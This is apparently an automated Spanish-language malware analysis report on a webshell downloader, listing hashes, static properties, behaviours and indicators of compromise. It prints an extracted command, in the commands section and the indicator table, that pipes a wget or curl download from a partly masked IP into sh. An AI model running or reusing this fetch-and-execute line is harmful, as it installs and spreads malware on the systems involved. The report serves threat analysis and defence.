# 🧬 Payload Analysis

`dc3fa42b50436d13cc6126c7e35ffdc66c3ab186df2513092724c0486a26143e`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/dc3fa42b50436d13cc6126c7e35ffdc66c3ab186df2513092724c0486a26143e.md](../../../../../malware-like/oraculo/downloader/dc3fa42b50436d13cc6126c7e35ffdc66c3ab186df2513092724c0486a26143e.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `High`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dc3fa42b50436d13cc6126c7e35ffdc66c3ab186df2513092724c0486a26143e`
- **SHA1:** `d7684efc1ebe9f8a462cd15534567b1a269f9fab`
- **MD5:** `f779c1158e293489bf5a0bc0eaa4fe2b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (320), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.6 |
| Strings | 102 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (320), with CRLF line terminators; strings=102; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.177.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
| hash | dc3fa42b50436d13cc6126c7e35ffdc66c3ab186df2513092724c0486a26143e | static_analysis |
| ip | 112.170.9.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
